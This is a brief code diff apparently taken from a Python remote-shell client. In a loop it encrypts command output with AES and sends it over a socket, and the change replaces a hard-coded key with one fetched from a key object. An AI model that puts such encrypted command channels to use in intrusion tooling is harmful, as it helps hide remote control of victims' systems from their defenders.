@@ -965,7 +965,7 @@ while True:
             output_str = str(output_byte).decode('utf-8')
             currentWD = os.getcwd() + "> "
 
-            eoutput = AES256._encrypt(output_str, d_key17)
+            eoutput = AES256._encrypt(output_str, tasklist_AES.get_key())
             send_one_message(s, eoutput)
 
 
